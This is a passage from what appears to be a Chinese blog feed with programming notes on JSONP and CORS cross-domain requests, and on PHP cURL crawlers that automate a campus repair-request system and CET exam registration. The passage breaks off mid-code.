<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    type: &apos;post&apos;,</span><br><span class="line">    url: &quot;http://w2.example.com/jsonp.php&quot;,</span><br><span class="line">    crossDomain: true,</span><br><span class="line">    data: &#123;u: &apos;Uknow&apos;, age: 20&#125;,</span><br><span class="line">    dataType: &quot;jsonp&quot;,</span><br><span class="line">    success: function(r)&#123;</span><br><span class="line">        console.log(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/w2-console4.png" alt=""></p>
<h3><span id="cors">CORS</span></h3><p>CORS定义一种跨域访问的机制，全称是”跨域资源共享”（Cross-origin resource sharing），可以让AJAX实现跨域访问。CORS 允许一个域上的网络应用向另一个域提交跨域 AJAX 请求。实现此功能非常简单，只需由服务器发送一个响应标头即可。</p>
<p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
<p>只要同时满足以下两大条件，就属于简单请求。</p>
<p>（1) 请求方法是以下三种方法之一：</p>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
<p>（2）HTTP的头信息不超出以下几种字段：</p>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</li>
</ul>
<p>凡是不同时满足上面两个条件，就属于非简单请求。</p>
<p>浏览器对这两种请求的处理，是不一样的。</p>
<p>对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。</p>
<p>Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p>
<p>非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。</p>
<p>非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求（preflight）。</p>
<p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。</p>
<p>即服务器响应头设置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header(&apos;Access-Control-Allow-Origin: *&apos;); // &quot;*&quot;号表示允许任何域向服务器端提交请求；也可以设置指定的域名，那么就允许来自这个域的请求：</span><br><span class="line">header(&apos;Access-Control-Allow-Methods: POST&apos;);</span><br><span class="line">header(&apos;Access-Control-Max-Age: 1000&apos;);</span><br></pre></td></tr></table></figure>
<ul>
<li>Access-Control-Allow-Origin:该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。</li>
<li>Access-Control-Allow-Methods:该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。</li>
<li>Access-Control-Max-Age:该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</li>
</ul>
<p>example.com/cors.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    type: &apos;post&apos;,</span><br><span class="line">    url: &quot;http://w2.example.com/cors.php&quot;,</span><br><span class="line">    crossDomain: true,</span><br><span class="line">    data: &#123;u: &apos;Uknow&apos;, age: 20&#125;,</span><br><span class="line">    dataType: &quot;json&quot;,</span><br><span class="line">    success: function(r)&#123;</span><br><span class="line">        console.log(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>w2.example.com/cors.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    header(&apos;Access-Control-Allow-Origin: *&apos;);</span><br><span class="line">    header(&apos;Access-Control-Allow-Methods: POST&apos;);</span><br><span class="line">    header(&apos;Access-Control-Max-Age: 1000&apos;);</span><br><span class="line">    if($_POST)&#123;</span><br><span class="line">        $arr = array(&apos;name&apos; =&gt; $_POST[&apos;u&apos;], &apos;age&apos; =&gt; $_POST[&apos;age&apos;]);</span><br><span class="line">        echo json_encode($arr);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo json_encode([]);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/w2-console5.png" alt=""></p>
<p>这样也是可以实现跨域post数据的。</p>
<p>兼容性。CORS是W3C中一项较新的方案，所以部分浏览器还没有对其进行支持或者完美支持，详情可移至 <a href="http://www.w3.org/TR/cors/。" target="_blank" rel="noopener">http://www.w3.org/TR/cors/。</a><br>安全问题。CORS提供了一种跨域请求方案，但没有为安全访问提供足够的保障机制，如果你需要信息的绝对安全，不要依赖CORS当中的权限制度，应当使用更多其它的措施来保障。</p>
<h2><span id="reference">Reference</span></h2><p><a href="http://www.cnblogs.com/alsy/p/5470772.html" target="_blank" rel="noopener">js实现跨域</a><br><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">跨域资源共享 CORS 详解</a><br><a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">浏览器同源政策及其规避方法</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP爬虫-物业报修系统一键校园物业报修]]></title>
      <url>https://uknowsec.cn/posts/notes/PHP%E7%88%AC%E8%99%AB-%E7%89%A9%E4%B8%9A%E6%8A%A5%E4%BF%AE%E7%B3%BB%E7%BB%9F%E4%B8%80%E9%94%AE%E6%A0%A1%E5%9B%AD%E7%89%A9%E4%B8%9A%E6%8A%A5%E4%BF%AE.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="前言">前言</span></h2><p>前面两个爬虫都是基于正方教务系统的，这个爬虫是根据学校的一个物业报修系统写的。</p>
<p>login_baoxiu.php页面有用到一个js做的select二级联动的操作。</p>
<p>require_baoxiu.php页面也就是三个post请求。</p>
<h2><span id="正文">正文</span></h2><h3><span id="login_baoxiuphp">login_baoxiu.php</span></h3><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/psb2.png" alt=""></p>
<p>以上界面中的保修物品里是需要一个select的二级联动的。</p>
<h3><span id="select二级联动">select二级联动</span></h3><p>这里简单的看一个二级联动的JS代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;select  id=&quot;a&quot;&gt;&lt;/select&gt;</span><br><span class="line">&lt;select id=&quot;b&quot;&gt;</span><br><span class="line">    &lt;option value=&quot;&quot;&gt;请选择&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>
<p>两个select标签，id=a的标签是第一级，id=b的标签是第二级。</p>
<p>再看JS代码，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var json = [&#123;</span><br><span class="line"></span><br><span class="line">              id: 1,</span><br><span class="line">              name: &apos;蔬菜&apos;,</span><br><span class="line">              child: [&#123;</span><br><span class="line">                  id: &apos;1&apos;,</span><br><span class="line">                  name: &apos;白菜&apos;</span><br><span class="line">              &#125;, &#123;</span><br><span class="line">                  id: &apos;2&apos;,</span><br><span class="line">                  name: &apos;萝卜&apos;</span><br><span class="line">              &#125;, &#123;</span><br><span class="line">                  id: &apos;3&apos;,</span><br><span class="line">                  name: &apos;菠菜&apos;</span><br><span class="line">              &#125;]</span><br><span class="line">          &#125;, &#123;</span><br><span class="line">              id: 2,</span><br><span class="line">              name: &apos;肉类&apos;,</span><br><span class="line">              child: [&#123;</span><br><span class="line">                  id: &apos;1&apos;,</span><br><span class="line">                  name: &apos;猪肉&apos;</span><br><span class="line">              &#125;, &#123;</span><br><span class="line">                  id: &apos;2&apos;,</span><br><span class="line">                  name: &apos;羊肉&apos;</span><br><span class="line">              &#125;, &#123;</span><br><span class="line">                  id: &apos;3&apos;,</span><br><span class="line">                  name: &apos;牛肉&apos;</span><br><span class="line">              &#125;]</span><br><span class="line">          &#125;, &#123;</span><br><span class="line">              id: 3,</span><br><span class="line">              name: &apos;蛋类&apos;,</span><br><span class="line">              child: [&#123;</span><br><span class="line">                  id: &apos;1&apos;,</span><br><span class="line">                  name: &apos;鸡蛋&apos;</span><br><span class="line">              &#125;, &#123;</span><br><span class="line">                  id: &apos;2&apos;,</span><br><span class="line">                  name: &apos;鹅蛋&apos;</span><br><span class="line">              &#125;, &#123;</span><br><span class="line">                  id: &apos;3&apos;,</span><br><span class="line">                  name: &apos;鸭蛋&apos;</span><br><span class="line">              &#125;]</span><br><span class="line">          &#125;];</span><br><span class="line">    var a = document.getElementById(&apos;a&apos;);</span><br><span class="line">    var b = document.getElementById(&apos;b&apos;);</span><br><span class="line">	json.map(function(s)&#123;   //相当于for循环，遍历json，这里s相当于一个json[i]</span><br><span class="line">            createop(s,a);        //这个函数是创建option并添加到select的函数，第一个参数是遍历的json[i],第二个是第一个select。第一个select的创建完成了。</span><br><span class="line">          &#125;);</span><br><span class="line">    a.onchange = function()&#123;    //当第一个select改变时</span><br><span class="line">            b.innerHTML = &apos;&apos;;         //清空第二个select的option   </span><br><span class="line">            json.map(function(s)&#123;    //遍历json</span><br><span class="line">                if(s.id==this.options[this.selectedIndex].id)&#123; //当你选中的option的id和json[i]的id相同时，也就是取到你第一个select选择的json[i].</span><br><span class="line">                    s.child.map(function(x)&#123;    //遍历这个json[i].child,得到每个分类</span><br><span class="line">                        createop(x,b);          //根据每个分类创建option添加到第二个select上</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;.bind(this));  //绑定this，改变this指向为a</span><br><span class="line">          &#125;</span><br><span class="line">    function createop(h,parent)&#123;</span><br><span class="line">              var op = document.createElement(&apos;option&apos;);  //创建option</span><br><span class="line">              var op_t = document.createTextNode(h.name);  //创建option的文字</span><br><span class="line">              op.appendChild(op_t);                    //添加文字到option中</span><br><span class="line">              op.id = h.id;                            //option的id赋值</span><br><span class="line">              parent.appendChild(op);                 //把option添加到传过来的select中</span><br><span class="line">          &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>在这个JS代码里定义了一个JSON对象来存放select的value值，从JSON中可以看出一共有3个父节点，每个父节点都有自己的子节点。</p>
<p>然后通过下面的js代码实现，当我们第一个select创建option时，遍历json把第一个select的子节点创建option添加到第二个select上</p>
<p>实现select标签的二级联动功能。这里根据require_baoxiu.php里面的提交数据POST包，把以上代码demo进行了一下修改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function createop(h,parent)&#123;</span><br><span class="line">             var op = document.createElement(&apos;option&apos;);  //创建option</span><br><span class="line">             var op_t = document.createTextNode(h.name);  //创建option的文字</span><br><span class="line">             op.appendChild(op_t);                    //添加文字到option中</span><br><span class="line">		  var op_a = document.createTextNode(h.id);  //创建option的id</span><br><span class="line">             op.appendChild(op_a);                    //添加id到option中</span><br><span class="line">             op.id = h.id;							//option的id赋值</span><br><span class="line">             parent.appendChild(op);                 //把option添加到传过来的select中</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>
<p>在这里，我把json中的id和name值都添加到了select,因为传给后面的参数需要这个ID值作为POST提交参数。</p>
<h3><span id="require_baoxiuphp">require_baoxiu.php</span></h3><p>获取到login_baoxiu.php提交过来的表单变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$userId=$_POST[&apos;account&apos;];</span><br><span class="line">$password=$_POST[&apos;password&apos;];</span><br><span class="line">$patterns = &quot;/\d+/&quot;;</span><br><span class="line">preg_match_all($patterns,$_POST[&apos;type1&apos;],$arr1);</span><br><span class="line">$type1=$arr1[0][0];</span><br><span class="line">preg_match_all($patterns,$_POST[&apos;type2&apos;],$arr2);</span><br><span class="line">$type2=$arr2[0][0];</span><br><span class="line">$districtname=$_POST[&apos;districtname&apos;];</span><br><span class="line">$floorid=$_POST[&apos;floorid&apos;];</span><br><span class="line">$dormitoryid=$_POST[&apos;dormitoryid&apos;];</span><br><span class="line">$phone=$_POST[&apos;phone&apos;];</span><br><span class="line">$describe=$_POST[&apos;describe&apos;];</span><br></pre></td></tr></table></figure>
<p>由于$type1和$type2变量传过来的是一个name+id的值，我们需要把name剔除。利用正则得到id值。</p>
<p>下面还是用到CURL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function login_post($url,$cookie,$post)&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);  //不自动输出数据，要echo才行</span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  //重要，抓取跳转后数据</span><br><span class="line">        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie); </span><br><span class="line">        curl_setopt($ch, CURLOPT_REFERER, &apos;http://localhost/Repair/&apos;);  //重要，302跳转需要referer，可以在Request Headers找到 </span><br><span class="line">        curl_setopt($ch, CURLOPT_POSTFIELDS,$post);  //post提交数据</span><br><span class="line">        $result=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        return $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>同样先获取cookie值，保存cookie。步骤跟正方教务系统是相同的。</p>
<p>整体的分析下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$login_url= &apos;http://localhost/Repair/UserServlet&apos;;</span><br><span class="line">$post=array(</span><br><span class="line">	&apos;flag&apos;=&gt; &apos;toCheckStuLogin&apos;,</span><br><span class="line">	&apos;userId&apos; =&gt; $userId,</span><br><span class="line">	&apos;password&apos; =&gt; $password</span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">$login_con = login_post($login_url,$cookie,http_build_query($post));</span><br></pre></td></tr></table></figure>
<p>登录到报修系统，这里用到的http_build_query()函数，而post请求包也是用到array，在上一篇说到的问题。</p>
<p>因为我们用到了http_build_query()函数，所以Content-Type还是application/x-www-form-urlencoded。</p>
<p>http_build_query()函数的作用就是是使用给出的关联(或下标)数组生成一个经过 URL-encode 的请求字符串。</p>
<p>然后更加抓包分析，我们需要把用户提交的地址更新一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$add_url1 = &apos;http://localhost/Repair/jsp/student/repair_add.jsp&apos;;</span><br><span class="line">$add_con=login_post($add_url1  ,$cookie,&apos;&apos;);</span><br><span class="line">preg_match_all(&apos;/&lt;input.+?(value=\&quot;(.+?)\&quot;)/&apos;,$add_con, $view); //获取__VIEWSTATE字段并存到$view数组中</span><br><span class="line">//var_dump($view[1][1]);</span><br><span class="line">preg_match_all($patterns,$view[1][1],$arr3);</span><br><span class="line">$tusersid = $arr3[0][0];</span><br><span class="line"></span><br><span class="line">$updateAddress_url = &apos;http://localhost/Repair/StudentServlet?flag=updateAddress&apos;;</span><br><span class="line">$updateAddress_post=array(	</span><br><span class="line">	&apos;tId&apos; =&gt; $tusersid,</span><br><span class="line">	&apos;districtname&apos; =&gt; $districtname,</span><br><span class="line">	&apos;floorid&apos; =&gt; $floorid,</span><br><span class="line">	&apos;dormitoryid&apos; =&gt; $dormitoryid</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$updateAddress_con = login_post($updateAddress_url,$cookie,http_build_query($updateAddress_post));</span><br></pre></td></tr></table></figure>
<p>将变量值传入更新用户的地址信息。</p>
<p>接下来就是提交报修信息了，也是用到一个post请求包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$repair_add_url = &quot;http://localhost/Repair/StudentServlet?userId=&quot;.$userId;</span><br><span class="line">$repair_add_post=array(	</span><br><span class="line">	&apos;flag&apos;=&gt; &apos;repairAdd&apos;,</span><br><span class="line">	&apos;tusersid&apos; =&gt; $tusersid,</span><br><span class="line">	&apos;districtname&apos; =&gt; $districtname,</span><br><span class="line">	&apos;floorid&apos; =&gt; $floorid,</span><br><span class="line">	&apos;dormitoryid&apos;=&gt; $dormitoryid,</span><br><span class="line">	&apos;phone&apos; =&gt; $phone,</span><br><span class="line">	&apos;goodsType&apos; =&gt; $type1,</span><br><span class="line">	&apos;goodsid&apos; =&gt; $type2,</span><br><span class="line">	&apos;describe&apos;=&gt; $describe</span><br><span class="line">);</span><br><span class="line">$repair_add_con = login_post($repair_add_url,$cookie,http_build_query($repair_add_post));</span><br></pre></td></tr></table></figure>
<p>到这里模拟提交报修信息的工作就完成了，后续我还做了一个简单的判断，判断是否登录成功。</p>
<h2><span id="github">Github</span></h2><p><a href="https://github.com/uknowsec/RepairCrawler" target="_blank" rel="noopener">https://github.com/uknowsec/RepairCrawler</a></p>
<h2><span id="reference">Reference</span></h2><p><a href="https://segmentfault.com/q/1010000011880594" target="_blank" rel="noopener">select二级联动</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP爬虫-正方教务系统一键报名四六级]]></title>
      <url>https://uknowsec.cn/posts/notes/PHP%E7%88%AC%E8%99%AB-%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E4%B8%80%E9%94%AE%E6%8A%A5%E5%90%8D%E5%9B%9B%E5%85%AD%E7%BA%A7.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="前言">前言</span></h2><p>在我们学校四六级也是在正方教务系统进行报名的，login页面是跟查询成绩绩点的差不多，就是添加了几个表单数据。</p>
<p>require页面中一点点区别，模拟登录和之前的成绩绩点爬取是一样的。在报名页面有个地方是很关键的。</p>
<h2><span id="正文">正文</span></h2><h3><span id="login_cetphp">login_cet.php</span></h3><p>login_cet.php页面跟login_grade.php是差不多的，获取到cookie和验证码保存到本地。</p>
<p>以下是提交表单界面</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/psb1.png" alt=""></p>
<h3><span id="require_cetphp">require_cet.php</span></h3><p>在前言说到，模拟登录跟之前是一样的，加之目前学校已经关闭了报名页面，所以无法抓包。</p>
<h3><span id="posting-multipart-form-data-using-curl-in-php">Posting multipart form data using curl in PHP</span></h3><p>如下代码demo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, &quot;http://localhost:8888&quot;);</span><br><span class="line">curl_setopt($ch, CURLOPT_CUSTOMREQUEST, &apos;POST&apos;);</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, array(&apos;a&apos; =&gt; &apos;b&apos;, &apos;c&apos; =&gt; &apos;d&apos;));</span><br><span class="line">curl_exec($ch);</span><br></pre></td></tr></table></figure>
<p>以上是一个简单的curl发送一个POST请求</p>
<p>这个demo的产生request如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost:8888</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 228</span><br><span class="line">Expect: 100-continue</span><br><span class="line">Content-Type: multipart/form-data; boundary=------------------------f287dd3807057a2c</span><br><span class="line"></span><br><span class="line">--------------------------f287dd3807057a2c</span><br><span class="line">Content-Disposition: form-data; name=&quot;a&quot;</span><br><span class="line">Content-Length: 1</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">--------------------------f287dd3807057a2c</span><br><span class="line">Content-Disposition: form-data; name=&quot;c&quot;</span><br><span class="line">Content-Length: 1</span><br><span class="line"></span><br><span class="line">d</span><br><span class="line">--------------------------f287dd3807057a2c--</span><br></pre></td></tr></table></figure>
<p>从以上代码中总结出的就是，在curl_setopt($ch, CURLOPT_POSTFIELDS, $post)这个函数中，</p>
<p>如果$post是字符串，则Content-Type是application/x-www-form-urlencoded。</p>
<p>如果$post是k=&gt;v的数组，则Content-Type是multipart/form-data</p>
<p>在这里因为这个爬虫中，确定提交的POST包的Content-Type是multipart/form-data。</p>
<p>所以这里有用到这个知识点。代码如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$params=[&apos;__EVENTTARGET&apos; =&gt; &apos;&apos;,&apos;__EVENTARGUMENT&apos;=&gt;&apos;&apos;,&apos;__VIEWSTATE&apos;=&gt;$state,&apos;txtxxmc&apos;=&gt;&apos;&apos;,$cet=&gt;&apos;on&apos;,&apos;txtSFZH&apos;=&gt;$idcard,&apos;btnSubmit&apos;=&gt;&apos;确 定&apos;,&apos;TextBox1&apos;=&gt;&apos;&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function post_cet($url2,$cookie,$params)</span><br><span class="line">&#123;</span><br><span class="line">	$ch = curl_init();</span><br><span class="line">	curl_setopt($ch, CURLOPT_URL, $url2);</span><br><span class="line">	curl_setopt($ch, CURLOPT_POST, true);</span><br><span class="line">	curl_setopt($ch,CURLOPT_HTTPHEADER,array(</span><br><span class="line">		&apos;User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&apos;,</span><br><span class="line">		&apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&apos;,</span><br><span class="line">		&apos;Accept-Encoding: gzip, deflate&apos;,</span><br><span class="line">		&apos;Accept-Language: zh-CN,zh;q=0.9&apos;,</span><br><span class="line">		&apos;Upgrade-Insecure-Requests: 1&apos;,</span><br><span class="line">		&apos;Cache-Control: max-age=0&apos;</span><br><span class="line">	));</span><br><span class="line">	curl_setopt($ch, CURLOPT_REFERER, $url2);</span><br><span class="line">	curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);  //不自动输出数据，要echo才行</span><br><span class="line">	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);</span><br><span class="line">	curl_setopt($ch, CURLOPT_POSTFIELDS, $params);</span><br><span class="line">//	curl_setopt($ch, CURLINFO_HEADER_OUT, TRUE);</span><br><span class="line">	curl_exec($ch);</span><br><span class="line">//	echo curl_getinfo($ch, CURLINFO_HEADER_OUT);</span><br><span class="line">	curl_close($ch);</span><br><span class="line">	return $response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con3=post_cet($url2,$cookie,$params);</span><br></pre></td></tr></table></figure>
<p>以上的代码就可以实现提交确认POST数据报了，接下来我还做了个简单的判断，判断是否报名成功。</p>
<p>如果报名成功了，页面会有报名记录的。这里因为无法抓包，就只能根据代码说明了。</p>
<p>这里我没有使用正则匹配，用到的xpath定位。</p>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">$con3=post_cet($url2,$cookie,$params);</span><br><span class="line">//echo $con3;</span><br><span class="line">// create document object model</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">// load html into document object model</span><br><span class="line">@$dom-&gt;loadHTML($con3);</span><br><span class="line">// create domxpath instance</span><br><span class="line">$xPath = new DOMXPath($dom);</span><br><span class="line">// get all elements with a particular id and then loop through and print the href attribute</span><br><span class="line">$elements = 